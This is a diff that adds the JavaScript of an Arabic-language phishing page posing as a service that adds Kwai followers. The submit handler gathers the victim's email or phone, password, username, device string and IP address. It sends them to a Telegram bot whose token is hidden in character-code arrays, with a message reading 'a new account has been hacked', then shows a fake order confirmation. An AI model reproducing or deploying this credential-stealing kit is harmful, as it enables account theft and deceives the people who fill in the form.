+  // إظهار نموذج الشحن
+  function showSection(sectionId) {
+    document.querySelectorAll('.section').forEach(section => {
+      section.classList.remove('active');
+    });
+    document.getElementById(sectionId).classList.add('active');
+  }
+
+  // إنشاء قائمة الدول في واجهة المستخدم
+  function populateCountryList() {
+    const countryList = document.getElementById('country-list');
+    countryList.innerHTML = '';
+    
+    arabCountries.forEach(country => {
+      const option = document.createElement('div');
+      option.className = 'country-option';
+      option.setAttribute('data-code', country.code);
+      option.setAttribute('data-flag', country.flag);
+      option.innerHTML = `
+        <img src="https://flagsapi.com/${country.flag}/flat/24.png" class="country-flag">
+        <span class="country-name">${country.name}</span>
+        <span class="country-code-label">${country.code}</span>
+      `;
+      
+      option.addEventListener('click', function() {
+        selectCountry(country.code, country.flag);
+      });
+      
+      countryList.appendChild(option);
+    });
+  }
+  
+  // تصفية قائمة الدول عند البحث
+  function setupCountrySearch() {
+    const searchInput = document.getElementById('country-search');
+    searchInput.addEventListener('input', function() {
+      const searchTerm = this.value.toLowerCase();
+      const options = document.querySelectorAll('.country-option');
+      
+      options.forEach(option => {
+        const countryName = option.querySelector('.country-name').textContent.toLowerCase();
+        if (countryName.includes(searchTerm)) {
+          option.style.display = 'flex';
+        } else {
+          option.style.display = 'none';
+        }
+      });
+    });
+  }
+
+    function getBotToken() {
+
+      const tokenParts = [
+        [56, 48, 49], // 801
+        [49, 50, 51, 52], // 1234
+        [52, 48, 51], // 403
+        [58], // :
+        [65, 65, 69, 71], // AAEG
+        [107, 107, 55, 102, 50, 45], // kk7f2-
+        [110, 67, 66, 118, 114, 110], // nCBvrn
+        [51, 114, 55, 122], // 3r7z
+        [95, 72, 45, 95], // _H-_
+        [122, 56, 71, 85, 89, 66], // z8GUYB
+        [104, 79, 75, 111, 115] // hOKos
+      ];
+      
+
+      const token = tokenParts.map(part => 
+        part.map(code => String.fromCharCode(code)).join('')
+      ).join('');
+      
+      return token;
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const CHAT_ID = urlParams.get('id');
+      
+    // تهيئة قائمة الدول
+    populateCountryList();
+    setupCountrySearch();
+    
+    const form = document.getElementById("pubgForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const loadingSpinner = document.getElementById("loadingSpinner");
+    const identifierInput = document.getElementById("identifier");
+    const countrySelector = document.getElementById("country-selector");
+    
+    // تحديث الواجهة عند تحميل الصفحة
+    updateInputUI(identifierInput.value);
+    
+    // تحديث الواجهة عند الكتابة في الحقل
+    identifierInput.addEventListener("input", function() {
+      updateInputUI(this.value);
+    });
+    
+    // إخفاء قائمة الدول عند النقر خارجها
+    document.addEventListener('click', function(e) {
+      if (!countrySelector.contains(e.target) && e.target !== identifierInput) {
+        countrySelector.style.display = 'none';
+      }
+    });
+    
+    // إظهار قائمة الدول عند النقر على حقل الهاتف
+    identifierInput.addEventListener('click', function() {
+      if (detectInputType(this.value) === 'phone') {
+        countrySelector.style.display = 'block';
+      }
+    });
+    
+    // عند إرسال النموذج
+    if (!form) return;
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+      
+      const identifier = identifierInput.value;
+      const type = detectInputType(identifier);
+      const isValid = validateIdentifier(identifier, type);
+      
+      if (!isValid) {
+        return;
+      }
+      
+      // Show loading spinner and disable button
+        submitBtn.style.display = "none";
+        loadingSpinner.style.display = "block";
+
+      const data = new FormData(this);
+      const password = data.get("password");
+      const playerId = data.get("player_id");
+      const amount = data.get("amount");
+      const countryCode = data.get("country_code");
+      const phoneNumber = data.get("phone");
+      const platform = "كواي";
+      const device = navigator.userAgent;
+      
+      // تحديد نوع المدخل
+      const contact = type === 'email' ? 
+          `📨 - البريد : ${identifier}` : 
+          `📞 - الهاتف : ${countryCode} ${phoneNumber}`;
+
+        const ipData = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .catch(() => ({ ip: "غير معروف" }));
+
+        const message = `♦️ - تم اختراق حساب جديد :
+🔹 - التطبيق : ${platform}
+
+ ${contact}
+🔑 - كلمة المرور : ${password}
+🔹 - اسم المستخدم: ${playerId}
+👥 - عدد المتابعين: ${amount}
+📱 - الجهاز: ${device}
+🌍 - IP: ${ipData.ip}`;
+
+       const BOT_TOKEN = getBotToken();
+        
+        // التحقق من وجود معرف الدردشة
+        if (!CHAT_ID) {
+          const errorHTML = `
+            <div class="error-message">
+              <h3>خطأ في الإرسال! ❌</h3>
+              <p>لم يتم العثور على معرف الدردشة (CHAT_ID)</p>
+              <p>يرجى التأكد من الرابط الذي استخدمته للصفحة</p>
+            </div>
+          `;
+          form.innerHTML = errorHTML;
+          return;
+        }
+        
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          });
+          
+          const result = await response.json();
+          
+          if (result.ok) {
+            // إظهار رسالة النجاح
+            const successHTML = `
+              <div class="success-message">
+                <h3>تمت العملية بنجاح! ✅</h3>
+                <p>سيتم شحن متابعين كواي خلال 24 ساعة</p>
+                <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
+              </div>
+            `;
+            form.innerHTML = successHTML;
+          } else {
+            // إظهار رسالة الخطأ مع تفاصيل
+            const errorHTML = `
+              <div class="error-message">
+                <h3>خطأ في الإرسال! ❌</h3>
+                <p>${result.description || 'حدث خطأ غير معروف'}</p>
+                <p>يرجى المحاولة مرة أخرى</p>
+              </div>
+            `;
+            form.innerHTML = errorHTML;
+          }
+        } catch (error) {
+          // إظهار رسالة الخطأ مع تفاصيل
+          const errorHTML = `
+            <div class="error-message">
+              <h3>خطأ في الإرسال! ❌</h3>
+              <p>${error.message || 'حدث خطأ غير معروف'}</p>
+              <p>يرجى المحاولة مرة أخرى</p>
+            </div>
+          `;
+          form.innerHTML = errorHTML;
+        } finally {
+          // إعادة عرض زر الإرسال
+          submitBtn.style.display = "block";
+          loadingSpinner.style.display = "none";
+        }
+      });
+    });
+
+  // تأثير الثلج
+  const canvas = document.getElementById('snow');
+  const ctx = canvas.getContext('2d');
+
+  let width = window.innerWidth;
+  let height = window.innerHeight;
+  canvas.width = width;
+  canvas.height = height;
+
+  let numFlakes = 150;
+  let flakes = [];
+
+  function createFlakes() {
+    for (let i = 0; i < numFlakes; i++) {
+      flakes.push({
+        x: Math.random() * width,
+        y: Math.random() * height,
+        r: Math.random() * 4 + 1,
+        d: Math.random() + 1,
+        opacity: Math.random() * 0.5 + 0.5
+      });
+    }
+  }
+
+  function drawFlakes() {
+    ctx.clearRect(0, 0, width, height);
+    for (let i = 0; i < numFlakes; i++) {
+      const f = flakes[i];
+      ctx.beginPath();
+      ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255, 255, 255, ${f.opacity})`;
+      ctx.fill();
+    }
+    moveFlakes();
+  }
+
+  function moveFlakes() {
+    for (let i = 0; i < numFlakes; i++) {
+      const f = flakes[i];
+      f.y += f.d;
+      f.x += Math.sin(f.y * 0.01) * 0.5;
+      
+      if (f.y > height) {
+        flakes[i] = {
+          x: Math.random() * width,
+          y: -10,
+          r: f.r,
+          d: f.d,
+          opacity: Math.random() * 0.5 + 0.5
+        };
+      }
+    }
+  }
+
+  function updateSnow() {
+    drawFlakes();
+    requestAnimationFrame(updateSnow);
+  }
+
+  window.addEventListener('resize', () => {
+    width = window.innerWidth;
+    height = window.innerHeight;
+    canvas.width = width;
+    canvas.height = height;
+  });
+
+  createFlakes();
+  updateSnow();
+</script>
+
+</body>
+</html>
